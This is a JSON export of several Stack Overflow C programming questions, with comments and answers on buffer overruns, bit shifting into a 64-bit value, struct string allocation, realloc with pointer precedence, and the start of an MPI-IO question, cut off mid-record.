{"tags": ["c", "memory-management", "runtime"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1542147254, "post_id": 53290243, "comment_id": 93462350, "body": "Are you sure the original line is less than 100 characters long? If it&#39;s longer, you&#39;ll cause undefined behavior."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1542147348, "post_id": 53290243, "comment_id": 93462383, "body": "The error indicates that you&#39;re trying to dereference a null pointer. Step through the code with a debugger to see where this is happening."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1542147460, "post_id": 53290243, "comment_id": 93462427, "body": "<code>while(j&lt;=i)</code> should be <code>while(j&lt;i)</code>."}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 1, "creation_date": 1542148576, "post_id": 53290243, "comment_id": 93462834, "body": "Unrelated, but the use of <code>strcat</code> in a loop like this is a textbook case of Schlemiel The Painter. <a href=\"https://www.joelonsoftware.com/2001/12/11/back-to-basics/\" rel=\"nofollow noreferrer\">joelonsoftware.com/2001/12/11/back-to-basics</a>"}, {"owner": {"reputation": 59, "user_id": 8120300, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e65b90ae4584f494bf00c2000e32e1ce?s=128&d=identicon&r=PG&f=1", "display_name": "Voxorin", "link": "https://stackoverflow.com/users/8120300/voxorin"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1542152299, "post_id": 53290243, "comment_id": 93463789, "body": "@Barmar you&#39;re right, please leave an answer. Can&#39;t believe I missed that for so long."}, {"owner": {"reputation": 80, "user_id": 2926044, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/532702508/picture?type=large", "display_name": "Cagri Candan", "link": "https://stackoverflow.com/users/2926044/cagri-candan"}, "edited": false, "score": 0, "creation_date": 1542158257, "post_id": 53290243, "comment_id": 93465168, "body": "I believe you need to allocate  dynamic memory instead of using  &quot;char originalLine[100];&quot; because if you exceed the 100 you will face with exception."}, {"owner": {"reputation": 382, "user_id": 2387608, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bf202db045fe101dac30b012f760871?s=128&d=identicon&r=PG&f=1", "display_name": "alamit", "link": "https://stackoverflow.com/users/2387608/alamit"}, "edited": false, "score": 0, "creation_date": 1542161438, "post_id": 53290243, "comment_id": 93465839, "body": "Using strdup to get dynamically allocated strings would be safer than using strcpy without checking the size of the input string."}], "answers": [{"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": true, "score": 0, "last_activity_date": 1542175821, "creation_date": 1542175821, "answer_id": 53294110, "question_id": 53290243, "link": "https://stackoverflow.com/questions/53290243/c-allocating-char-array-causing-bad-access-runtime-exception/53294110#53294110", "title": "C allocating char array causing bad access runtime exception", "body": "<p>You're accessing outside the <code>correctLine</code> array when you get to <code>j == i</code>, because the last valid index in <code>correctLine</code> is <code>j-1</code>. Change </p>\n\n<pre><code>while(j&lt;=i){\n</code></pre>\n\n<p>to</p>\n\n<pre><code>while(j&lt;i){\n</code></pre>\n"}], "owner": {"reputation": 59, "user_id": 8120300, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e65b90ae4584f494bf00c2000e32e1ce?s=128&d=identicon&r=PG&f=1", "display_name": "Voxorin", "link": "https://stackoverflow.com/users/8120300/voxorin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 53294110, "answer_count": 1, "score": 0, "last_activity_date": 1542175821, "creation_date": 1542146939, "question_id": 53290243, "link": "https://stackoverflow.com/questions/53290243/c-allocating-char-array-causing-bad-access-runtime-exception", "title": "C allocating char array causing bad access runtime exception", "body": "<p>I seem to be having trouble correctly allocating memory for my array. The method is returning as expected, but a runtime exception is killing the program.</p>\n\n<p>I got this exception while using my debugger.</p>\n\n<pre><code>EXC_BAD_ACCESS (code=1, address=0x0)\n</code></pre>\n\n<p>This is the method causing the issue:</p>\n\n<pre><code>char *progScanner(char *line){\n\n    char originalLine[100];\n    strcpy(originalLine, line);\n    char *correctLine[100];\n    char *segment;\n    int i = 0;\n\n    segment = strtok(originalLine,\" ,()\");\n    while (segment != NULL){\n        printf (\" %s\",segment);\n        correctLine[i++] = segment;\n        segment = strtok (NULL, \" ,()\");\n    }\n\n    char *newLine;\n    newLine = malloc(100 * sizeof(char));\n    int j = 1;\n    strcpy (newLine, correctLine[0]);\n    while(j&lt;=i){\n        strcat(newLine, correctLine[j]);\n        j++;\n    }\n\n    return newLine;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5541, "user_id": 4367864, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/mIepQ.png?s=128&g=1", "display_name": "PC Luddite", "link": "https://stackoverflow.com/users/4367864/pc-luddite"}, "edited": false, "score": 0, "creation_date": 1542146774, "post_id": 53290205, "comment_id": 93462170, "body": "Where is <code>final_val</code> declared? please provide the minimum code to reproduce"}, {"owner": {"reputation": 619, "user_id": 3797407, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d331b35b40437cef3ebacc833188eaf?s=128&d=identicon&r=PG", "display_name": "Patrik Valkovi\u010d", "link": "https://stackoverflow.com/users/3797407/patrik-valkovi%c4%8d"}, "edited": false, "score": 3, "creation_date": 1542146819, "post_id": 53290205, "comment_id": 93462188, "body": "I think you refer to 64 bit value instead of 64 bytes."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 1, "creation_date": 1542146863, "post_id": 53290205, "comment_id": 93462197, "body": "Does casting val1/2/3/4 to uint64_t  before shifting do the trick?"}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 3, "creation_date": 1542146974, "post_id": 53290205, "comment_id": 93462235, "body": "You&#39;ve got a strict-aliasing violation when you dereference a pointer to <code>final_val[0]</code> as a <code>uint64_t</code>."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1542147121, "post_id": 53290205, "comment_id": 93462283, "body": "left-shifting a 32-bit int produces a 32-bit result"}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 0, "creation_date": 1542147170, "post_id": 53290205, "comment_id": 93462307, "body": "And should <code>val1</code> be shifted 32 instead of 31?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1542147306, "post_id": 53290205, "comment_id": 93462366, "body": "<code>uint64_t *ptr =...    printf(&quot;%p  0x%x \\n&quot;,ptr,*ptr);</code> implies your compiler is not helping you with good warnings.  Enable all warnings or get a new compiler."}], "answers": [{"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542191178, "post_id": 53290359, "comment_id": 93476743, "body": "For a complete answer, please add a note that <code>uint64_t *ptr = (uint64_t *)ADDR ;</code> is a strict aliasing violation and UB, or alternatively just drop <code>ptr</code> in favour for an <code>uint64_t</code>. And we really shouldn&#39;t shift on <code>int</code> or other signed types, ever. So the version with explicit casts on all operands is always to prefer."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 2, "last_activity_date": 1542148298, "last_edit_date": 1542148298, "creation_date": 1542147468, "answer_id": 53290359, "question_id": 53290205, "link": "https://stackoverflow.com/questions/53290205/create-a-64-bit-result-using-different-values/53290359#53290359", "title": "Create a 64-bit result using different values", "body": "<p>Each of the shift terms except the first is evaluated as an <code>int</code>; the first is evaluated as a <code>uint32_t</code> which is probably an <code>unsigned int</code>.  These results are then or'd together in a <code>uint32_t</code>, and then assigned to your 64-bit result.</p>\n\n<p>You need at least the first shift performed as a 64-bit calculation:</p>\n\n<pre><code>*ptr = (uint64_t)val1 &lt;&lt; 32 | val2 &lt;&lt; 24 | val3 &lt;&lt; 16 | val4;\n</code></pre>\n\n<p>This can shift by 32 (as required, instead of 31 as before) because the shift is smaller than the size of the operand (<code>uint64_t</code>).  Previously, you couldn't use 32 because you'd be told the shift is too big.</p>\n\n<p>You might prefer the symmetry of:</p>\n\n<pre><code>*ptr = (uint64_t)val1 &lt;&lt; 32 | (uint64_t)val2 &lt;&lt; 24 | (uint64_t)val3 &lt;&lt; 16 | (uint64_t)val4;\n</code></pre>\n\n<p>Your printing is also faulty.  You should be using the macros from <code>&lt;inttypes.h&gt;</code> to specify the format for the <code>uint64_t</code> value:</p>\n\n<pre><code>printf(\"%p  0x%\" PRIx64 \"\\n\", ptr, *ptr);\n</code></pre>\n\n<p>Note that if you used <code>unsigned long long *ptr</code> etc, you'd use <code>0x%llx</code>.</p>\n\n<p>The use of <code>final_val</code> is also dubious at best; it could crash on some machine types if <code>final_val</code> is not appropriately aligned for a 64-bit type (not aligned on a 64-bit boundary).  In the code shown, you should simply use a <code>uint64_t</code> variable to be the target of the pointer (since the code shown doesn't use <code>final_val</code> otherwise).  If you did need to use the array of <code>uint8_t</code> values for some reason, then there are better ways to load the data.  You'd get different results on little-endian vs big-endian machines, too.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 4, "last_activity_date": 1542148135, "last_edit_date": 1542148135, "creation_date": 1542147731, "answer_id": 53290414, "question_id": 53290205, "link": "https://stackoverflow.com/questions/53290205/create-a-64-bit-result-using-different-values/53290414#53290414", "title": "Create a 64-bit result using different values", "body": "<p>To create a 64-bit value:</p>\n\n<p>1) Insure shifts are done with 64-bit operands when the result exceeds 32 bits.</p>\n\n<pre><code>val1&lt;&lt;31    \n(uint64_t) val1 &lt;&lt; 31\n</code></pre>\n\n<p>2) Shift 32, not 31 bits to achieve the goal of NNNNNNNNxyz</p>\n\n<p>3) Avoid pointers tricks. </p>\n\n<pre><code>uint8_t final_val[8];\n// uint64_t *ptr = (uint64_t *)ADDR ;\nuint64_t u64 = (uint64_t) val1 &lt;&lt; 32 | val2 &lt;&lt; 24 | val3 &lt;&lt;16 | val4;\nmemcpy(final_val, &amp;u64, sizeof final_val);\n</code></pre>\n\n<p>4) Use matching printf specifiers.</p>\n\n<pre><code>#include &lt;inttypes.h&gt;\n//            v---- Not x, x is for unsigned\n// printf(\"0x%x\\n\", u64);\nprintf(\"0x%\" PRIx64 \"\\n\", u64);\n//           ^----^ from inttypes.h\n</code></pre>\n"}], "owner": {"reputation": 1537, "user_id": 968000, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/tU8sw.jpg?s=128&g=1", "display_name": "user968000", "link": "https://stackoverflow.com/users/968000/user968000"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 53290359, "answer_count": 2, "score": -1, "last_activity_date": 1542148298, "creation_date": 1542146669, "last_edit_date": 1542147640, "question_id": 53290205, "link": "https://stackoverflow.com/questions/53290205/create-a-64-bit-result-using-different-values", "title": "Create a 64-bit result using different values", "body": "<p>I have to create a 64byte value using <code>val1</code>, <code>val2</code>, <code>val3</code> and <code>val4</code>.\nOutput should look like: <code>0xabcdabcd01000000</code>, but I am getting <code>0x81000000</code></p>\n\n<pre><code>uint32_t val1 = 0xabcdabcd;\nuint8_t val2 = 1;\nuint8_t val3 = 0;\nuint16_t val4 = 0;\nuint8_t final_val[8];\n#define ADDR (&amp;final_val[0])\n//The output format is as follows: NNNNNNNNxyz\n// NNNNNNNN: value1  in hex \n// x - val2, \n// y - val3, \n// z - val4  \nint main() {\n\n   uint64_t *ptr = (uint64_t *)ADDR ;\n   *ptr = val1&lt;&lt;31|val2&lt;&lt;24|val3&lt;&lt;16|val4;\n   printf(\"%p  0x%x \\n\", ptr, *ptr);\n   return 0;\n\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "struct"], "comments": [{"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 1, "creation_date": 1542146750, "post_id": 53290154, "comment_id": 93462155, "body": "where does it segfault?  have you tried debugging it?  also format the new lines for the readers better please."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1542147559, "post_id": 53290154, "comment_id": 93462468, "body": "Welcome to Stack Overflow! <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">don&#39;t cast malloc</a>"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1542147801, "post_id": 53290154, "comment_id": 93462583, "body": "<code>Sch[i]-&gt;name[j - 1] = &#39;\\0&#39;;</code> is wrong. You&#39;re replacing the 2nd-to-last character in the name with a null byte. You should be adding the null byte <i>after</i> the last character. But you need to <code>realloc()</code> first to make room for this."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1542147919, "post_id": 53290154, "comment_id": 93462638, "body": "<code>TOP100</code> is an array of pointers. Did you ever allocate memory for each element to point to?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1542147993, "post_id": 53290154, "comment_id": 93462659, "body": "Although this code misplaces the string terminators, that does mean that it avoids overrunning the bounds of the not-large-enough array, so that doesn&#39;t explain the segfault.  Unless you have an empty name (no characters before the comma), in which case it tries to write before the start of the array."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1542148009, "post_id": 53290154, "comment_id": 93462662, "body": "There&#39;s nothing here that will cause a segfault, unless there&#39;s a school with a 1-character name. The problem is most likely in the code that calls it. I&#39;ll bet you forgot to allocate memory for the school objects."}], "answers": [{"tags": [], "owner": {"reputation": 1107, "user_id": 16429, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/711da651c41e52cdfb806c12e8c91dd1?s=128&d=identicon&r=PG", "display_name": "Clay", "link": "https://stackoverflow.com/users/16429/clay"}, "is_accepted": false, "score": 0, "last_activity_date": 1542148711, "creation_date": 1542148711, "answer_id": 53290569, "question_id": 53290154, "link": "https://stackoverflow.com/questions/53290154/char-in-a-struct-passed-through-to-function-how-to-access-this-data/53290569#53290569", "title": "char * in a struct passed through to function. How to access this data?", "body": "<p>I think the easier way is to use the C library to your advantage. I don't have your input file, but this should work or at least get you a lot closer:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>void input_schools(FILE *IN, School **Sch, int school_size)\n{\n  printf(\"in input_schools() ... \\n\\n\\n\");\n\n  char *name;\n  char *state;\n  char *line;\n  size_t line_len;\n\n  for(int i=0; i&lt;school_size; ++i) {\n    line = NULL;\n    line_len=0;\n\n    // get line: line will contain a newly-allocated string\n    // that holds a single line from the file\n    if(-1 == getline(&amp;line, &amp;line_len, IN)) {\n      // end of file reached\n      break;\n    }\n\n    // make a new school\n    Sch[i] = (School*)malloc(sizeof(School));\n\n    // allocate storage for the name and state\n    name = malloc(line_len); // we know that line_len is &gt;= the size of the name\n    state = malloc(line_len); // we know that line_len is &gt;= the size of the state\n\n    // everything before the = is the name, everything after is the state\n    sscanf(line, \"%[^=]s = %[^=]s\", name, state);\n\n    // free the memory getline() allocated\n    free(line);\n\n    Sch[i]-&gt;name = name;\n    Sch[i]-&gt;state = state;\n  } // end for all possible schools\n} // end input_schools\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 10648154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/025d51487d35ccf5de3ee4be0e30c9bd?s=128&d=identicon&r=PG&f=1", "display_name": "codingstruggles", "link": "https://stackoverflow.com/users/10648154/codingstruggles"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542148711, "creation_date": 1542146444, "last_edit_date": 1542147604, "question_id": 53290154, "link": "https://stackoverflow.com/questions/53290154/char-in-a-struct-passed-through-to-function-how-to-access-this-data", "title": "char * in a struct passed through to function. How to access this data?", "body": "<pre><code>typedef struct school_ {\n    char *name;\n    char *state;\n} School;\n</code></pre>\n\n<p>Above is the struct format I am required to use to store data from a file in the format</p>\n\n<p>name, state</p>\n\n<p>name2, state2</p>\n\n<p>Below I was given a declaration of an array of pointers and the second line is how the function is called.</p>\n\n<pre><code>School *TOP100[school_size];\n\ninput_schools(school_info,TOP100,school_size);\n</code></pre>\n\n<p>In my function I need to store a dynamic string as the name for each of 100 schools.</p>\n\n<p>I've written the following, however have gotten a seg fault. How can I change my function <strong>without changing the code above</strong>?</p>\n\n<pre><code>void input_schools(FILE *IN, School **Sch, int k) {\n    printf(\"in input_schools() ... \\n\\n\\n\");\n\n    int i, j = 0;\n    char ch;\n\n    for (i = 0; i &lt; k; i++) {\n        fscanf(IN, \"%c\", &amp;ch);\n        Sch[i]-&gt;name = (char *) malloc(sizeof (char));\n        j = 0;\n        Sch[i]-&gt;name[j] = ch;\n\n        while (ch != ',') {\n            fscanf(IN, \"%c\", &amp;ch);\n            j++;\n            Sch[i]-&gt;name = (char *) realloc(Sch[i]-&gt;name, sizeof(char) * (j + 1));\n            Sch[i]-&gt;name[j] = ch;\n        }\n        Sch[i]-&gt;name[j - 1] = '\\0';\n    }\n\n    return;\n}\n</code></pre>\n\n<p>While this code compiles it returns a seg fault.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1542145213, "post_id": 53289791, "comment_id": 93461564, "body": "where does it fail"}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542145264, "post_id": 53289791, "comment_id": 93461587, "body": "when you step through what value of i is the last value before it segfaults, what line does it segfault, what are the values of the params when it segfaults."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 4, "creation_date": 1542145818, "post_id": 53289791, "comment_id": 93461818, "body": "<code>*seqList[curSeqListSize]</code> ==&gt; <code>(*seqList)[curSeqListSize]</code>. And fyi, you never adjust <code>curSeqListSize</code>, which ideally would be passed by pointer as well and updated accordingly for the caller."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1542146045, "post_id": 53289791, "comment_id": 93461905, "body": "<a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">don&#39;t cast malloc</a>"}, {"owner": {"reputation": 413, "user_id": 9261771, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d8d7fbebf82d1d8b2dd51cb1984950b?s=128&d=identicon&r=PG&f=1", "display_name": "H.Rappeport", "link": "https://stackoverflow.com/users/9261771/h-rappeport"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1542146136, "post_id": 53289791, "comment_id": 93461945, "body": "@WhozCraig That solves it, thanks! If you&#39;d like to post an answer I&#39;d be happy to accept it."}], "answers": [{"tags": [], "owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "is_accepted": true, "score": 1, "last_activity_date": 1542146665, "creation_date": 1542146665, "answer_id": 53290201, "question_id": 53289791, "link": "https://stackoverflow.com/questions/53289791/why-does-my-dynamic-array-of-string-pointers-cause-a-segmentation-fault/53290201#53290201", "title": "Why does my dynamic array of string pointers cause a segmentation fault?", "body": "<p>Your a victim of failing to understand <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\"><em>operator precedence</em></a>. In C, <code>[]</code> has higher precedence than <code>*</code>, so this:</p>\n\n<pre><code>*seqList[curSeqListSize] = ...\n</code></pre>\n\n<p>says \"find the <code>curSeqListSize</code>  slotted <code>char**</code> in the sequence of <code>char**</code> pointed to by <code>seqList</code>, then dereference <em>that</em>. That's wrong. You need to shove higher precedence in to your <code>seqList</code> expression, and <code>()</code> will do that:</p>\n\n<pre><code>(*seqList)[curSeqListSize] = ...\n</code></pre>\n\n<p>says \"Get the <code>char**</code> pointed to by <code>seqList</code>, then get the <code>curSeqListSize</code> slotted <code>char*</code> from that.</p>\n\n<p>I'd change a number of other things, but that's where your wheels fell off the wagon.</p>\n"}], "owner": {"reputation": 413, "user_id": 9261771, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d8d7fbebf82d1d8b2dd51cb1984950b?s=128&d=identicon&r=PG&f=1", "display_name": "H.Rappeport", "link": "https://stackoverflow.com/users/9261771/h-rappeport"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 53290201, "answer_count": 1, "score": 1, "last_activity_date": 1542148503, "creation_date": 1542144625, "last_edit_date": 1542148503, "question_id": 53289791, "link": "https://stackoverflow.com/questions/53289791/why-does-my-dynamic-array-of-string-pointers-cause-a-segmentation-fault", "title": "Why does my dynamic array of string pointers cause a segmentation fault?", "body": "<p>I would like to hold a dynamic list of objects. I am not allowed to use VLAs, so I wrote the following function: (Originally this was a list of structs I defined, but I reproduced the same problem with strings.)</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid appendSeq(char ** seq, char *** seqList, size_t curSeqListSize) {\n    if (*seqList == NULL)\n        *seqList = (char **) malloc(sizeof(char *));\n    else\n        *seqList = (char **) realloc(*seqList, sizeof(char *) * (curSeqListSize + 1));\n    if (*seqList == NULL)\n        exit(EXIT_FAILURE);\n    *seqList[curSeqListSize] = *seq;\n}\n\nint main()\n{\n    char *curSeq = \"\";\n    char ** seqList = NULL;\n\n    for (int i = 0; i &lt; 3; i++)\n    {\n        curSeq = \"Sequence\";\n        char* curSeqCopy = strdup(curSeq);\n        appendSeq(&amp;curSeqCopy, &amp;seqList, i);\n    }\n}\n</code></pre>\n\n<p>This fails with a segmentation error, and it seems that the realloc() function is not doing its job - Why?</p>\n"}, {"tags": ["c", "mpi", "openmp", "mpi-io"], "comments": [{"owner": {"reputation": 7287, "user_id": 8062491, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rd6rD.png?s=128&g=1", "display_name": "Gilles Gouaillardet", "link": "https://stackoverflow.com/users/8062491/gilles-gouaillardet"}, "edited": false, "score": 2, "creation_date": 1542144730, "post_id": 53289713, "comment_id": 93461350, "body": "a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> is welcome ! simply put a comment instead of writing to the file."}, {"owner": {"reputation": 7287, "user_id": 8062491, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rd6rD.png?s=128&g=1", "display_name": "Gilles Gouaillardet", "link": "https://stackoverflow.com/users/8062491/gilles-gouaillardet"}, "edited": false, "score": 0, "creation_date": 1542228305, "post_id": 53289713, "comment_id": 93497645, "body": "do all the lines have the same and fixed length ?"}, {"owner": {"reputation": 1, "user_id": 10648567, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Vandeghen Renaud", "link": "https://stackoverflow.com/users/10648567/vandeghen-renaud"}, "reply_to_user": {"reputation": 7287, "user_id": 8062491, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rd6rD.png?s=128&g=1", "display_name": "Gilles Gouaillardet", "link": "https://stackoverflow.com/users/8062491/gilles-gouaillardet"}, "edited": false, "score": 0, "creation_date": 1542234495, "post_id": 53289713, "comment_id": 93500170, "body": "Normally yes but anyway each process will know how many lines it has to write. @GillesGouaillardet"}, {"owner": {"reputation": 7287, "user_id": 8062491, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rd6rD.png?s=128&g=1", "display_name": "Gilles Gouaillardet", "link": "https://stackoverflow.com/users/8062491/gilles-gouaillardet"}, "edited": false, "score": 0, "creation_date": 1542237454, "post_id": 53289713, "comment_id": 93501169, "body": "what matters is how many bytes each task has to know, if you do not know that, this is gonna be complicated."}, {"owner": {"reputation": 1, "user_id": 10648567, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Vandeghen Renaud", "link": "https://stackoverflow.com/users/10648567/vandeghen-renaud"}, "reply_to_user": {"reputation": 7287, "user_id": 8062491, "user_type": "registered", "profile_image": 